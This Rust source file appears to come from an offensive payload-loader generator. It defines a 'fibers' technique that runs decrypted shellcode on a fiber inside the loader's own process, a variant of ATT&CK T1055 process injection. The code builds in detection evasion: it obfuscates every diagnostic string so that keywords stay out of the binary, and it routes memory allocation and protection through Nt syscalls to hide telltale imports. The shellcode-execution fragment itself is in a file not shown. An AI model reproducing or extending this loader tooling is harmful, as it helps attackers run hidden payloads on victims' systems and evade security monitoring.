//! Fiber execution.
//!
//! Runs the decrypted payload on a fiber created in the current process, so the
//! payload never owns a thread of its own and the loader keeps control when it
//! returns. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for fiber execution: which payload to run (the payload format
/// and export live in the payload's `build.payloads` entry).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
}

/// Static metadata for fiber execution.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "fibers",
    // ATT&CK has no fiber-specific sub-technique (T1055.001–T1055.015 cover
    // DLL/PE injection, APC, TLS, hollowing, ...). Scheduling the payload on a
    // fiber of the loader's own thread is a process-injection variant, so the
    // T1055 parent is the precise mapping.
    attck: &["T1055"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/fibers/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[super::PayloadFormat::Shellcode],
    requires_indirect_syscalls: false,
    params_example: "technique: fibers\n",
    readme: include_str!("README.md"),
    // The payload is copied into a private region and made executable through
    // the syscall layer (`nt_alloc_vm` + `nt_protect_vm`), so `mode: indirect`
    // keeps the VirtualAllocEx/VirtualProtectEx imports out of the stub. The
    // fiber entry points (`ConvertThreadToFiber`, `CreateFiberEx`,
    // `SwitchToFiber`, `DeleteFiber`, `ConvertFiberToThread`) stay Win32: a
    // fiber is not a thread and there is no syscall for creating one.
    syscalls: &["NtAllocateVirtualMemory", "NtProtectVirtualMemory"],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — least of all a technique keyword
/// like `loader` — lands in the generated stub's `.rdata`. Messages that
/// interpolate a value keep a keyword-free `format!` literal at the call site
/// (`format!` cannot take a runtime format string).
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_EMPTY$", "the payload is empty"),
    (
        "$MSG_ALLOC_FAILED$",
        "could not allocate the payload region",
    ),
    (
        "$MSG_CONVERT_FAILED$",
        "could not convert the current thread to a fiber (it is already one?)",
    ),
    (
        "$MSG_CREATE_FIBER_FAILED$",
        "could not create the payload fiber",
    ),
    (
        "$MSG_PROTECT_FAILED$",
        "could not make the payload executable",
    ),
];

impl Params {
    /// Renders the fiber-execution stub fragment.
    ///
    /// Every runtime message is rebuilt from `strings`'s obfuscated bytes, and
    /// the payload-format guard is resolved here: the technique runs raw
    /// shellcode, so a `pe`/`dll`/`dotnet` payload gets a fragment that fails
    /// with a clear message instead of jumping into a file header. (A build-time
    /// rule for that combination belongs in `plan::validate`; the guard covers a
    /// plan that slips through.)
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let unsupported_format = format!(
            "the fibers technique runs raw shellcode payloads only (this payload's format is '{}')",
            format.label()
        );

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("fiber_msg_{index}")),
            );
        }
        rendered
            .replace(
                "$SUPPORTED_FORMAT$",
                if format == PayloadFormat::Shellcode {
                    "true"
                } else {
                    "false"
                },
            )
            .replace(
                "$MSG_UNSUPPORTED_FORMAT$",
                &strings
                    .obfuscate(&unsupported_format)
                    .render_stub_expr("fiber_unsupported"),
            )
    }
}

#[cfg(test)]
mod tests;
